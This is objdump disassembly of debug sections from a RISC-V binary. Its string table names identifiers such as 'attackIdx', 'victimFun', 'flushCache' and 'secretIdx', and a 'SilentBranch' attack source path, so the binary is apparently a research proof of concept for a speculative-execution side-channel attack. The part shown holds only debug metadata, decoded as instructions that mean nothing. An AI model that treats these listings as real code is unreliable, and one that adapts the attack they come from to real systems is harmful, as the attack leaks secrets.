     f76:	0302                	slli	t1,t1,0x0
     f78:	0900                	addi	s0,sp,144
     f7a:	000a                	c.slli	zero,0x2
     f7c:	0001                	nop
     f7e:	0402                	slli	s0,s0,0x0
     f80:	0304                	addi	s1,sp,384
     f82:	0900                	addi	s0,sp,144
     f84:	000a                	c.slli	zero,0x2
     f86:	0601                	addi	a2,a2,0
     f88:	14090403          	lb	s0,320(s2)
     f8c:	0100                	addi	s0,sp,128
     f8e:	0200                	addi	s0,sp,256
     f90:	0204                	addi	s1,sp,256
     f92:	02090103          	lb	sp,32(s2)
     f96:	0100                	addi	s0,sp,128
     f98:	0200                	addi	s0,sp,256
     f9a:	0204                	addi	s1,sp,256
     f9c:	0e097f03          	0xe097f03
     fa0:	0100                	addi	s0,sp,128
     fa2:	0200                	addi	s0,sp,256
     fa4:	0104                	addi	s1,sp,128
     fa6:	0306                	slli	t1,t1,0x1
     fa8:	0900                	addi	s0,sp,144
     faa:	000a                	c.slli	zero,0x2
     fac:	0601                	addi	a2,a2,0
     fae:	0a090203          	lb	tp,160(s2)
     fb2:	0100                	addi	s0,sp,128
     fb4:	02090403          	lb	s0,32(s2)
     fb8:	0100                	addi	s0,sp,128
     fba:	16090103          	lb	sp,352(s2)
     fbe:	0100                	addi	s0,sp,128
     fc0:	08090103          	lb	sp,128(s2)
     fc4:	0100                	addi	s0,sp,128
     fc6:	0e090103          	lb	sp,224(s2)
     fca:	0100                	addi	s0,sp,128
     fcc:	0c090203          	lb	tp,192(s2)
     fd0:	0100                	addi	s0,sp,128
     fd2:	06090103          	lb	sp,96(s2)
     fd6:	0100                	addi	s0,sp,128
     fd8:	02090403          	lb	s0,32(s2)
     fdc:	0100                	addi	s0,sp,128
     fde:	06090103          	lb	sp,96(s2)
     fe2:	0100                	addi	s0,sp,128
     fe4:	02090503          	lb	a0,32(s2)
     fe8:	0100                	addi	s0,sp,128
     fea:	06090103          	lb	sp,96(s2)
     fee:	0100                	addi	s0,sp,128
     ff0:	02090503          	lb	a0,32(s2)
     ff4:	0100                	addi	s0,sp,128
     ff6:	06090103          	lb	sp,96(s2)
     ffa:	0100                	addi	s0,sp,128
     ffc:	0e090103          	lb	sp,224(s2)
    1000:	0100                	addi	s0,sp,128
    1002:	0e090503          	lb	a0,224(s2)
    1006:	0100                	addi	s0,sp,128
    1008:	06090203          	lb	tp,96(s2)
    100c:	0100                	addi	s0,sp,128
    100e:	14090203          	lb	tp,320(s2)
    1012:	0100                	addi	s0,sp,128
    1014:	1e090103          	lb	sp,480(s2)
    1018:	0100                	addi	s0,sp,128
    101a:	02090403          	lb	s0,32(s2)
    101e:	0100                	addi	s0,sp,128
    1020:	0c090103          	lb	sp,192(s2)
    1024:	0100                	addi	s0,sp,128
    1026:	02090403          	lb	s0,32(s2)
    102a:	0100                	addi	s0,sp,128
    102c:	0e090103          	lb	sp,224(s2)
    1030:	0100                	addi	s0,sp,128
    1032:	08090103          	lb	sp,128(s2)
    1036:	0100                	addi	s0,sp,128
    1038:	097ef803          	0x97ef803
    103c:	0002                	c.slli	zero,0x0
    103e:	0301                	addi	t1,t1,0
    1040:	0902                	slli	s2,s2,0x0
    1042:	0002                	c.slli	zero,0x0
    1044:	0301                	addi	t1,t1,0
    1046:	0189                	addi	gp,gp,2
    1048:	0209                	addi	tp,tp,2
    104a:	0100                	addi	s0,sp,128
    104c:	0c090303          	lb	t1,192(s2)
    1050:	0100                	addi	s0,sp,128
    1052:	1e090203          	lb	tp,480(s2)
    1056:	0100                	addi	s0,sp,128
    1058:	0c090203          	lb	tp,192(s2)
    105c:	0100                	addi	s0,sp,128
    105e:	18090303          	lb	t1,384(s2)
    1062:	0100                	addi	s0,sp,128
    1064:	02090103          	lb	sp,32(s2)
    1068:	0100                	addi	s0,sp,128
    106a:	0a090903          	lb	s2,160(s2)
    106e:	0100                	addi	s0,sp,128
    1070:	14090103          	lb	sp,320(s2)
    1074:	0100                	addi	s0,sp,128
    1076:	08090103          	lb	sp,128(s2)
    107a:	0100                	addi	s0,sp,128
    107c:	12090103          	lb	sp,288(s2)
    1080:	0100                	addi	s0,sp,128
    1082:	10090103          	lb	sp,256(s2)
    1086:	0100                	addi	s0,sp,128
    1088:	08097603          	0x8097603
    108c:	0100                	addi	s0,sp,128
    108e:	0304                	addi	s1,sp,384
    1090:	097f8b03          	lb	s6,151(t6) # fffffffffffe7097 <_end+0xffffffff7ffcbe97>
    1094:	0020                	addi	s0,sp,8
    1096:	0401                	addi	s0,s0,0
    1098:	0302                	slli	t1,t1,0x0
    109a:	440900f7          	0x440900f7
    109e:	0100                	addi	s0,sp,128
    10a0:	08090103          	lb	sp,128(s2)
    10a4:	0100                	addi	s0,sp,128
    10a6:	0c090903          	lb	s2,192(s2)
    10aa:	0100                	addi	s0,sp,128
    10ac:	1a090103          	lb	sp,416(s2)
    10b0:	0100                	addi	s0,sp,128
    10b2:	08090303          	lb	t1,128(s2)
    10b6:	0100                	addi	s0,sp,128
    10b8:	10090103          	lb	sp,256(s2)
    10bc:	0100                	addi	s0,sp,128
    10be:	0a090303          	lb	t1,160(s2)
    10c2:	0100                	addi	s0,sp,128
    10c4:	12090103          	lb	sp,288(s2)
    10c8:	0100                	addi	s0,sp,128
    10ca:	14090103          	lb	sp,320(s2)
    10ce:	0100                	addi	s0,sp,128
    10d0:	08090103          	lb	sp,128(s2)
    10d4:	0100                	addi	s0,sp,128
    10d6:	08090103          	lb	sp,128(s2)
    10da:	0100                	addi	s0,sp,128
    10dc:	02090103          	lb	sp,32(s2)
    10e0:	0100                	addi	s0,sp,128
    10e2:	1c097f03          	0x1c097f03
    10e6:	0100                	addi	s0,sp,128
    10e8:	14090303          	lb	t1,320(s2)
    10ec:	0100                	addi	s0,sp,128
    10ee:	08090103          	lb	sp,128(s2)
    10f2:	0100                	addi	s0,sp,128
    10f4:	08090103          	lb	sp,128(s2)
    10f8:	0100                	addi	s0,sp,128
    10fa:	02090103          	lb	sp,32(s2)
    10fe:	0100                	addi	s0,sp,128
    1100:	20097f03          	0x20097f03
    1104:	0100                	addi	s0,sp,128
    1106:	12090303          	lb	t1,288(s2)
    110a:	0100                	addi	s0,sp,128
    110c:	04090103          	lb	sp,64(s2)
    1110:	0100                	addi	s0,sp,128
    1112:	08090303          	lb	t1,128(s2)
    1116:	0100                	addi	s0,sp,128
    1118:	14090103          	lb	sp,320(s2)
    111c:	0100                	addi	s0,sp,128
    111e:	0e090103          	lb	sp,224(s2)
    1122:	0100                	addi	s0,sp,128
    1124:	0c090103          	lb	sp,192(s2)
    1128:	0100                	addi	s0,sp,128
    112a:	10090103          	lb	sp,256(s2)
    112e:	0100                	addi	s0,sp,128
    1130:	10090103          	lb	sp,256(s2)
    1134:	0100                	addi	s0,sp,128
    1136:	10090203          	lb	tp,256(s2)
    113a:	0100                	addi	s0,sp,128
    113c:	08090103          	lb	sp,128(s2)
    1140:	0100                	addi	s0,sp,128
    1142:	02090103          	lb	sp,32(s2)
    1146:	0100                	addi	s0,sp,128
    1148:	12097f03          	0x12097f03
    114c:	0100                	addi	s0,sp,128
    114e:	14090303          	lb	t1,320(s2)
    1152:	0100                	addi	s0,sp,128
    1154:	08090103          	lb	sp,128(s2)
    1158:	0100                	addi	s0,sp,128
    115a:	02090103          	lb	sp,32(s2)
    115e:	0100                	addi	s0,sp,128
    1160:	18097f03          	0x18097f03
    1164:	0100                	addi	s0,sp,128
    1166:	12090303          	lb	t1,288(s2)
    116a:	0100                	addi	s0,sp,128
    116c:	04090103          	lb	sp,64(s2)
    1170:	0100                	addi	s0,sp,128
    1172:	08090303          	lb	t1,128(s2)
    1176:	0100                	addi	s0,sp,128
    1178:	0a090103          	lb	sp,160(s2)
    117c:	0100                	addi	s0,sp,128
    117e:	08090103          	lb	sp,128(s2)
    1182:	0100                	addi	s0,sp,128
    1184:	02090103          	lb	sp,32(s2)
    1188:	0100                	addi	s0,sp,128
    118a:	0a097f03          	0xa097f03
    118e:	0100                	addi	s0,sp,128
    1190:	0a090203          	lb	tp,160(s2)
    1194:	0100                	addi	s0,sp,128
    1196:	0c090103          	lb	sp,192(s2)
    119a:	0100                	addi	s0,sp,128
    119c:	08090303          	lb	t1,128(s2)
    11a0:	0100                	addi	s0,sp,128
    11a2:	0e090103          	lb	sp,224(s2)
    11a6:	0100                	addi	s0,sp,128
    11a8:	08090103          	lb	sp,128(s2)
    11ac:	0100                	addi	s0,sp,128
    11ae:	02090103          	lb	sp,32(s2)
    11b2:	0100                	addi	s0,sp,128
    11b4:	0a097f03          	0xa097f03
    11b8:	0100                	addi	s0,sp,128
    11ba:	0200                	addi	s0,sp,256
    11bc:	0104                	addi	s1,sp,128
    11be:	0306                	slli	t1,t1,0x1
    11c0:	0900                	addi	s0,sp,144
    11c2:	000e                	c.slli	zero,0x3
    11c4:	0601                	addi	a2,a2,0
    11c6:	0a090203          	lb	tp,160(s2)
    11ca:	0100                	addi	s0,sp,128
    11cc:	0c090103          	lb	sp,192(s2)
    11d0:	0100                	addi	s0,sp,128
    11d2:	08090303          	lb	t1,128(s2)
    11d6:	0100                	addi	s0,sp,128
    11d8:	0200                	addi	s0,sp,256
    11da:	0204                	addi	s1,sp,256
    11dc:	0e090403          	lb	s0,224(s2)
    11e0:	0100                	addi	s0,sp,128
    11e2:	0200                	addi	s0,sp,256
    11e4:	0204                	addi	s1,sp,256
    11e6:	14090103          	lb	sp,320(s2)
    11ea:	0100                	addi	s0,sp,128
    11ec:	0200                	addi	s0,sp,256
    11ee:	0204                	addi	s1,sp,256
    11f0:	14090103          	lb	sp,320(s2)
    11f4:	0100                	addi	s0,sp,128
    11f6:	0200                	addi	s0,sp,256
    11f8:	0104                	addi	s1,sp,128
    11fa:	0306                	slli	t1,t1,0x1
    11fc:	0900                	addi	s0,sp,144
    11fe:	000a                	c.slli	zero,0x2
    1200:	0601                	addi	a2,a2,0
    1202:	14090203          	lb	tp,320(s2)
    1206:	0100                	addi	s0,sp,128
    1208:	14090103          	lb	sp,320(s2)
    120c:	0100                	addi	s0,sp,128
    120e:	08090303          	lb	t1,128(s2)
    1212:	0100                	addi	s0,sp,128
    1214:	0e090103          	lb	sp,224(s2)
    1218:	0100                	addi	s0,sp,128
    121a:	08090103          	lb	sp,128(s2)
    121e:	0100                	addi	s0,sp,128
    1220:	0200                	addi	s0,sp,256
    1222:	0104                	addi	s1,sp,128
    1224:	0306                	slli	t1,t1,0x1
    1226:	0900                	addi	s0,sp,144
    1228:	0002                	c.slli	zero,0x0
    122a:	0601                	addi	a2,a2,0
    122c:	26090203          	lb	tp,608(s2)
    1230:	0100                	addi	s0,sp,128
    1232:	04090103          	lb	sp,64(s2)
    1236:	0100                	addi	s0,sp,128
    1238:	08090303          	lb	t1,128(s2)
    123c:	0100                	addi	s0,sp,128
    123e:	0a090103          	lb	sp,160(s2)
    1242:	0100                	addi	s0,sp,128
    1244:	04090103          	lb	sp,64(s2)
    1248:	0100                	addi	s0,sp,128
    124a:	04090203          	lb	tp,64(s2)
    124e:	0100                	addi	s0,sp,128
    1250:	02090103          	lb	sp,32(s2)
    1254:	0100                	addi	s0,sp,128
    1256:	0a097f03          	0xa097f03
    125a:	0100                	addi	s0,sp,128
    125c:	12090303          	lb	t1,288(s2)
    1260:	0100                	addi	s0,sp,128
    1262:	0200                	addi	s0,sp,256
    1264:	0104                	addi	s1,sp,128
    1266:	0306                	slli	t1,t1,0x1
    1268:	0900                	addi	s0,sp,144
    126a:	0012                	c.slli	zero,0x4
    126c:	0601                	addi	a2,a2,0
    126e:	12090103          	lb	sp,288(s2)
    1272:	0100                	addi	s0,sp,128
    1274:	20090103          	lb	sp,512(s2)
    1278:	0100                	addi	s0,sp,128
    127a:	0a090303          	lb	t1,160(s2)
    127e:	0100                	addi	s0,sp,128
    1280:	02090103          	lb	sp,32(s2)
    1284:	0100                	addi	s0,sp,128
    1286:	10090103          	lb	sp,256(s2)
    128a:	0100                	addi	s0,sp,128
    128c:	24097e03          	0x24097e03
    1290:	0100                	addi	s0,sp,128
    1292:	0a090503          	lb	a0,160(s2)
    1296:	0100                	addi	s0,sp,128
    1298:	0200                	addi	s0,sp,256
    129a:	0104                	addi	s1,sp,128
    129c:	0306                	slli	t1,t1,0x1
    129e:	0900                	addi	s0,sp,144
    12a0:	0008                	0x8
    12a2:	0001                	nop
    12a4:	0402                	slli	s0,s0,0x0
    12a6:	0302                	slli	t1,t1,0x0
    12a8:	0900                	addi	s0,sp,144
    12aa:	000a                	c.slli	zero,0x2
    12ac:	0001                	nop
    12ae:	0402                	slli	s0,s0,0x0
    12b0:	0605                	addi	a2,a2,1
    12b2:	04090103          	lb	sp,64(s2)
    12b6:	0100                	addi	s0,sp,128
    12b8:	0809                	addi	a6,a6,2
    12ba:	0000                	unimp
    12bc:	0101                	addi	sp,sp,0

Disassembly of section .debug_str:

0000000000000000 <.debug_str>:
   0:	645f 6f73 685f      	0x685f6f73645f
   6:	6e61                	lui	t3,0x18
   8:	6c64                	ld	s1,216(s0)
   a:	0065                	c.nop	25
   c:	6172                	ld	sp,280(sp)
   e:	646e                	ld	s0,216(sp)
  10:	72636573          	csrrsi	a0,0x726,6
  14:	7465                	lui	s0,0xffff9
  16:	7500                	ld	s0,40(a0)
  18:	756e                	ld	a0,248(sp)
  1a:	31646573          	csrrsi	a0,0x316,8
  1e:	5f00                	lw	s0,56(a4)
  20:	6172                	ld	sp,280(sp)
  22:	646e                	ld	s0,216(sp)
  24:	3834                	fld	fa3,112(s0)
  26:	5f00                	lw	s0,56(a4)
  28:	6d65                	lui	s10,0x19
  2a:	7265                	lui	tp,0xffff9
  2c:	636e6567          	0x636e6567
  30:	0079                	c.nop	30
  32:	5f5f 6975 746e      	0x746e69755f5f
  38:	5f38                	lw	a4,120(a4)
  3a:	0074                	addi	a3,sp,12
  3c:	4f746573          	csrrsi	a0,0x4f7,8
  40:	6666                	ld	a2,88(sp)
  42:	00746573          	csrrsi	a0,0x7,8
  46:	6170                	ld	a2,192(a0)
  48:	6e497373          	csrrci	t1,0x6e4,18
  4c:	6449                	lui	s0,0x12
  4e:	0078                	addi	a4,sp,12
  50:	775f 7263 6f74      	0x6f747263775f
  56:	626d                	lui	tp,0x1b
  58:	735f 6174 6574      	0x65746174735f
  5e:	5f00                	lw	s0,56(a4)
  60:	72736377          	0x72736377
  64:	6f74                	ld	a3,216(a4)
  66:	626d                	lui	tp,0x1b
  68:	74735f73          	csrrwi	t5,0x747,6
  6c:	7461                	lui	s0,0xffff8
  6e:	0065                	c.nop	25
  70:	6f6c                	ld	a1,216(a4)
  72:	676e                	ld	a4,216(sp)
  74:	6c20                	ld	s0,88(s0)
  76:	20676e6f          	jal	t3,7627c <_tbss_end+0x761f8>
  7a:	6e75                	lui	t3,0x1d
  7c:	6e676973          	csrrsi	s2,0x6e6,14
  80:	6465                	lui	s0,0x19
  82:	6920                	ld	s0,80(a0)
  84:	746e                	ld	s0,248(sp)
  86:	5f00                	lw	s0,56(a4)
  88:	626c                	ld	a1,192(a2)
  8a:	7366                	ld	t1,120(sp)
  8c:	7a69                	lui	s4,0xffffa
  8e:	0065                	c.nop	25
  90:	6461                	lui	s0,0x18
  92:	7264                	ld	s1,224(a2)
  94:	5f00                	lw	s0,56(a4)
  96:	695f 746e 3436      	0x3436746e695f
  9c:	745f 5f00 6c5f      	0x6c5f5f00745f
  a2:	6c61636f          	jal	t1,16768 <_tbss_end+0x166e4>
  a6:	5f65                	li	t5,-7
  a8:	0074                	addi	a3,sp,12
  aa:	6d5f 7262 6f74      	0x6f7472626d5f
  b0:	735f6377          	0x735f6377
  b4:	6174                	ld	a3,192(a0)
  b6:	6574                	ld	a3,200(a0)
  b8:	7200                	ld	s0,32(a2)
  ba:	6e61                	lui	t3,0x18
  bc:	4964                	lw	s1,84(a0)
  be:	7864                	ld	s1,240(s0)
  c0:	5f00                	lw	s0,56(a4)
  c2:	6f746377          	0x6f746377
  c6:	626d                	lui	tp,0x1b
  c8:	735f 6174 6574      	0x65746174735f
  ce:	5f00                	lw	s0,56(a4)
  d0:	745f 5f6d 6573      	0x65735f6d745f
  d6:	61770063          	beq	a4,s7,6d6 <_tbss_end+0x652>
  da:	4f79                	li	t5,30
  dc:	6666                	ld	a2,88(sp)
  de:	00746573          	csrrsi	a0,0x7,8
  e2:	6f6c                	ld	a1,216(a4)
  e4:	676e                	ld	a4,216(sp)
  e6:	6c20                	ld	s0,88(s0)
  e8:	20676e6f          	jal	t3,762ee <_tbss_end+0x7626a>
  ec:	6e69                	lui	t3,0x1a
  ee:	0074                	addi	a3,sp,12
  f0:	755f 7562 0066      	0x667562755f
  f6:	625f 7361 0065      	0x657361625f
  fc:	7564                	ld	s1,232(a0)
  fe:	6d6d                	lui	s10,0x1b
 100:	0079                	c.nop	30
 102:	5f5f 6d74 685f      	0x685f6d745f5f
 108:	0072756f          	jal	a0,2790e <_tbss_end+0x2788a>
 10c:	5f5f 6377 0068      	0x6863775f5f
 112:	5f5f 6673 5f00      	0x5f0066735f5f
 118:	655f6e6f          	jal	t3,f6f6c <_tbss_end+0xf6ee8>
 11c:	6978                	ld	a4,208(a0)
 11e:	5f74                	lw	a3,124(a4)
 120:	7261                	lui	tp,0xffff8
 122:	61007367          	0x61007367
 126:	7474                	ld	a3,232(s0)
 128:	6361                	lui	t1,0x18
 12a:	7864496b          	0x7864496b
 12e:	5f00                	lw	s0,56(a4)
 130:	6b6f6f63          	bltu	t5,s6,7ee <_tbss_end+0x76a>
 134:	6569                	lui	a0,0x1a
 136:	5f00                	lw	s0,56(a4)
 138:	735f 6c67 6575      	0x65756c67735f
 13e:	2f00                	fld	fs0,24(a4)
 140:	6f68                	ld	a0,216(a4)
 142:	656d                	lui	a0,0x1b
 144:	6568632f          	0x6568632f
 148:	676e                	ld	a4,216(sp)
 14a:	6978                	ld	a4,208(a0)
 14c:	6f61                	lui	t5,0x18
 14e:	7579                	lui	a0,0xffffe
 150:	6c69732f          	0x6c69732f
 154:	6e65                	lui	t3,0x19
 156:	6274                	ld	a3,192(a2)
 158:	6172                	ld	sp,280(sp)
 15a:	636e                	ld	t1,216(sp)
 15c:	2f68                	fld	fa0,216(a4)
 15e:	656c6953          	0x656c6953
 162:	746e                	ld	s0,248(sp)
 164:	7242                	ld	tp,48(sp)
 166:	6e61                	lui	t3,0x18
 168:	532f6863          	bltu	t5,s2,698 <_tbss_end+0x614>
 16c:	6c69                	lui	s8,0x1a
 16e:	6e65                	lui	t3,0x19
 170:	5f74                	lw	a3,124(a4)
 172:	7242                	ld	tp,48(sp)
 174:	6e61                	lui	t3,0x18
 176:	73656863          	bltu	a0,s6,8a6 <_tbss_end+0x822>
 17a:	535f 4246 612f      	0x612f4246535f
 180:	7474                	ld	a3,232(s0)
 182:	6361                	lui	t1,0x18
 184:	665f006b          	0x665f006b
 188:	616c                	ld	a1,192(a0)
 18a:	5f007367          	0x5f007367
 18e:	7369                	lui	t1,0xffffa
 190:	635f 6178 5f00      	0x5f006178635f
 196:	69647473          	csrrci	s0,0x696,8
 19a:	006e                	c.slli	zero,0x1b
 19c:	5674756f          	jal	a0,47f02 <_tbss_end+0x47e7e>
 1a0:	6c61                	lui	s8,0x18
 1a2:	7241                	lui	tp,0xffff0
 1a4:	6172                	ld	sp,280(sp)
 1a6:	0079                	c.nop	30
 1a8:	625f 6b6c 6973      	0x69736b6c625f
 1ae:	657a                	ld	a0,408(sp)
 1b0:	5f00                	lw	s0,56(a4)
 1b2:	62747663          	bleu	t2,s0,7de <_tbss_end+0x75a>
 1b6:	6675                	lui	a2,0x1d
 1b8:	5f00                	lw	s0,56(a4)
 1ba:	7366666f          	jal	a2,668f0 <_tbss_end+0x6686c>
 1be:	7465                	lui	s0,0xffff9
 1c0:	5f00                	lw	s0,56(a4)
 1c2:	626d                	lui	tp,0x1b
 1c4:	6f747273          	csrrci	tp,0x6f7,8
 1c8:	5f736377          	0x5f736377
 1cc:	74617473          	csrrci	s0,0x746,2
 1d0:	0065                	c.nop	25
 1d2:	6d5f 7262 656c      	0x656c72626d5f
 1d8:	5f6e                	lw	t5,248(sp)
 1da:	74617473          	csrrci	s0,0x746,2
 1de:	0065                	c.nop	25
 1e0:	665f 616e 6772      	0x6772616e665f
 1e6:	665f0073          	0x665f0073
 1ea:	736e                	ld	t1,248(sp)
 1ec:	5f00                	lw	s0,56(a4)
 1ee:	6e676973          	csrrsi	s2,0x6e6,14
 1f2:	5f00                	lw	s0,56(a4)
 1f4:	745f 706d 5f00      	0x5f00706d745f
 1fa:	6c66                	ld	s8,88(sp)
 1fc:	5f6b636f          	jal	t1,b67f2 <_tbss_end+0xb676e>
 200:	0074                	addi	a3,sp,12
 202:	735f 6474 7265      	0x72656474735f
 208:	0072                	c.slli	zero,0x1c
 20a:	425f 6769 6e69      	0x6e696769425f
 210:	0074                	addi	a3,sp,12
 212:	675f 6d61 616d      	0x616d6d61675f
 218:	735f 6769 676e      	0x676e6769735f
 21e:	6d61                	lui	s10,0x18
 220:	5f00                	lw	s0,56(a4)
 222:	6572                	ld	a0,280(sp)
 224:	6461                	lui	s0,0x18
 226:	5f00                	lw	s0,56(a4)
 228:	6572                	ld	a0,280(sp)
 22a:	746c7573          	csrrci	a0,0x746,24
 22e:	6b5f 5f00 745f      	0x745f5f006b5f
 234:	006d                	c.nop	27
 236:	6e69                	lui	t3,0x1a
 238:	7241                	lui	tp,0xffff0
 23a:	6172                	ld	sp,280(sp)
 23c:	5379                	li	t1,-2
 23e:	7a69                	lui	s4,0xffffa
 240:	0065                	c.nop	25
 242:	5f5f 6377 6268      	0x626863775f5f
 248:	5f00                	lw	s0,56(a4)
 24a:	6f647473          	csrrci	s0,0x6f6,8
 24e:	7475                	lui	s0,0xffffd
 250:	5f00                	lw	s0,56(a4)
 252:	6c747663          	bleu	t2,s0,91e <_tbss_end+0x89a>
 256:	6e65                	lui	t3,0x19
 258:	6900                	ld	s0,16(a0)
 25a:	416e                	lw	sp,216(sp)
 25c:	7272                	ld	tp,312(sp)
 25e:	7961                	lui	s2,0xffff8
 260:	5f00                	lw	s0,56(a4)
 262:	6966                	ld	s2,88(sp)
 264:	656c                	ld	a1,200(a0)
 266:	5f00                	lw	s0,56(a4)
 268:	696e                	ld	s2,216(sp)
 26a:	0073626f          	jal	tp,36a70 <_tbss_end+0x369ec>
 26e:	726f6873          	csrrsi	a6,0x726,30
 272:	2074                	fld	fa3,192(s0)
 274:	6e75                	lui	t3,0x1d
 276:	6e676973          	csrrsi	s2,0x6e6,14
 27a:	6465                	lui	s0,0x19
 27c:	6920                	ld	s0,80(a0)
 27e:	746e                	ld	s0,248(sp)
 280:	5f00                	lw	s0,56(a4)
 282:	7461                	lui	s0,0xffff8
 284:	7865                	lui	a6,0xffff9
 286:	7469                	lui	s0,0xffffa
 288:	0030                	addi	a2,sp,8
 28a:	6c66                	ld	s8,88(sp)
 28c:	7375                	lui	t1,0xffffd
 28e:	4368                	lw	a0,68(a4)
 290:	6361                	lui	t1,0x18
 292:	6568                	ld	a0,200(a0)
 294:	5f00                	lw	s0,56(a4)
 296:	6e676973          	csrrsi	s2,0x6e6,14
 29a:	6c61                	lui	s8,0x18
 29c:	625f 6675 5f00      	0x5f006675625f
 2a2:	7361                	lui	t1,0xffff8
 2a4:	6d697463          	bleu	s6,s2,96c <_tbss_end+0x8e8>
 2a8:	5f65                	li	t5,-7
 2aa:	7562                	ld	a0,56(sp)
 2ac:	0066                	c.slli	zero,0x19
 2ae:	725f 7365 6c75      	0x6c757365725f
 2b4:	0074                	addi	a3,sp,12
 2b6:	2f637273          	csrrci	tp,0x2f6,6
 2ba:	3176                	fld	ft2,376(sp)
 2bc:	2e626673          	csrrsi	a2,0x2e6,4
 2c0:	69770063          	beq	a4,s7,940 <_tbss_end+0x8bc>
 2c4:	746e                	ld	s0,248(sp)
 2c6:	745f 5f00 6f6c      	0x6f6c5f00745f
 2cc:	5f006b63          	bltu	zero,a6,8c2 <_tbss_end+0x83e>
 2d0:	6c66                	ld	s8,88(sp)
 2d2:	6761                	lui	a4,0x18
 2d4:	76003273          	csrrc	tp,0x760,zero
 2d8:	6369                	lui	t1,0x1a
 2da:	6974                	ld	a3,208(a0)
 2dc:	466d                	li	a2,27
 2de:	6e75                	lui	t3,0x1d
 2e0:	775f0063          	beq	t5,s5,a40 <_tbss_end+0x9bc>
 2e4:	6972                	ld	s2,280(sp)
 2e6:	6574                	ld	a3,200(a0)
 2e8:	4700                	lw	s0,8(a4)
 2ea:	554e                	lw	a0,240(sp)
 2ec:	4320                	lw	s0,64(a4)
 2ee:	3131                	addiw	sp,sp,-20
 2f0:	3720                	fld	fs0,104(a4)
 2f2:	322e                	fld	ft4,232(sp)
 2f4:	302e                	fld	ft0,232(sp)
 2f6:	2d20                	fld	fs0,88(a0)
 2f8:	636d                	lui	t1,0x1b
 2fa:	6f6d                	lui	t5,0x1b
 2fc:	6564                	ld	s1,200(a0)
 2fe:	3d6c                	fld	fa1,248(a0)
 300:	656d                	lui	a0,0x1b
 302:	6164                	ld	s1,192(a0)
 304:	796e                	ld	s2,248(sp)
 306:	2d20                	fld	fs0,88(a0)
 308:	616d                	addi	sp,sp,240
 30a:	6372                	ld	t1,280(sp)
 30c:	3d68                	fld	fa0,248(a0)
 30e:	7672                	ld	a2,312(sp)
 310:	3436                	fld	fs0,360(sp)
 312:	6d69                	lui	s10,0x1a
 314:	6661                	lui	a2,0x18
 316:	6364                	ld	s1,192(a4)
 318:	2d20                	fld	fs0,88(a0)
 31a:	616d                	addi	sp,sp,240
 31c:	6962                	ld	s2,24(sp)
 31e:	6c3d                	lui	s8,0xf
 320:	3670                	fld	fa2,232(a2)
 322:	6434                	ld	a3,72(s0)
 324:	2d20                	fld	fs0,88(a0)
 326:	4f2d2067          	0x4f2d2067
 32a:	2030                	fld	fa2,64(s0)
 32c:	662d                	lui	a2,0xb
 32e:	6f6e                	ld	t5,216(sp)
 330:	632d                	lui	t1,0xb
 332:	6f6d6d6f          	jal	s10,d6a28 <_tbss_end+0xd69a4>
 336:	206e                	fld	ft0,216(sp)
 338:	662d                	lui	a2,0xb
 33a:	6f6e                	ld	t5,216(sp)
 33c:	622d                	lui	tp,0xb
 33e:	6975                	lui	s2,0x1d
 340:	746c                	ld	a1,232(s0)
 342:	6e69                	lui	t3,0x1a
 344:	702d                	c.lui	zero,0xfffeb
 346:	6972                	ld	s2,280(sp)
 348:	746e                	ld	s0,248(sp)
 34a:	0066                	c.slli	zero,0x19
 34c:	6e75                	lui	t3,0x1d
 34e:	7375                	lui	t1,0xffffd
 350:	6465                	lui	s0,0x19
 352:	0032                	c.slli	zero,0xc
 354:	6e5f 616d 6c6c      	0x6c6c616d6e5f
 35a:	7400636f          	jal	t1,6a9a <_tbss_end+0x6a16>
 35e:	7754706f          	j	482d2 <_tbss_end+0x4824e>
 362:	7864496f          	jal	s2,44ae8 <_tbss_end+0x44a64>
 366:	6c00                	ld	s0,24(s0)
 368:	20676e6f          	jal	t3,7656e <_tbss_end+0x764ea>
 36c:	6f64                	ld	s1,216(a4)
 36e:	6275                	lui	tp,0x1d
 370:	656c                	ld	a1,200(a0)
 372:	5f00                	lw	s0,56(a4)
 374:	656e                	ld	a0,216(sp)
 376:	7478                	ld	a4,232(s0)
 378:	0066                	c.slli	zero,0x19
 37a:	5f5f 6d74 6d5f      	0x6d5f6d745f5f
 380:	5f006e6f          	jal	t3,6970 <_tbss_end+0x68ec>
 384:	7461                	lui	s0,0xffff8
 386:	7865                	lui	a6,0xffff9
 388:	7469                	lui	s0,0xffffa
 38a:	7300                	ld	s0,32(a4)
 38c:	6275                	lui	tp,0x1d
 38e:	6174706f          	j	481a4 <_tbss_end+0x48120>
 392:	6772                	ld	a4,280(sp)
 394:	5f00                	lw	s0,56(a4)
 396:	735f 6964 6964      	0x69646964735f
 39c:	696e                	ld	s2,216(sp)
 39e:	0074                	addi	a3,sp,12
 3a0:	6f5f 6666 745f      	0x745f66666f5f
 3a6:	6100                	ld	s0,0(a0)
 3a8:	7272                	ld	tp,312(sp)
 3aa:	7961                	lui	s2,0xffff8
 3ac:	0031                	c.nop	12
 3ae:	7261                	lui	tp,0xffff8
 3b0:	6172                	ld	sp,280(sp)
 3b2:	3279                	addiw	tp,tp,-2
 3b4:	5f00                	lw	s0,56(a4)
 3b6:	755f 6e69 3674      	0x36746e69755f
 3bc:	5f34                	lw	a3,120(a4)
 3be:	0074                	addi	a3,sp,12
 3c0:	6975                	lui	s2,0x1d
 3c2:	6554                	ld	a3,136(a0)
 3c4:	706d                	c.lui	zero,0xffffb
 3c6:	7300                	ld	s0,32(a4)
 3c8:	6365                	lui	t1,0x19
 3ca:	6572                	ld	a0,280(sp)
 3cc:	4974                	lw	a3,84(a0)
 3ce:	7864                	ld	s1,240(s0)
 3d0:	5f00                	lw	s0,56(a4)
 3d2:	7266                	ld	tp,120(sp)
 3d4:	6565                	lui	a0,0x19
 3d6:	696c                	ld	a1,208(a0)
 3d8:	5f007473          	csrrci	s0,0x5f0,0
 3dc:	4f4c                	lw	a1,28(a4)
 3de:	525f4b43          	fmadd.d	fs6,ft10,ft5,fa0,rmm
 3e2:	4345                	li	t1,17
 3e4:	5255                	li	tp,-11
 3e6:	45564953          	0x45564953
 3ea:	545f 6e00 6d75      	0x6d756e00545f
 3f0:	73746553          	0x73746553
 3f4:	61656c43          	fmadd.s	fs8,fa0,fs6,fa2,unknown
 3f8:	0072                	c.slli	zero,0x1c
 3fa:	6e75                	lui	t3,0x1d
 3fc:	6e676973          	csrrsi	s2,0x6e6,14
 400:	6465                	lui	s0,0x19
 402:	6320                	ld	s0,64(a4)
 404:	6168                	ld	a0,192(a0)
 406:	0072                	c.slli	zero,0x1c
 408:	7564                	ld	s1,232(a0)
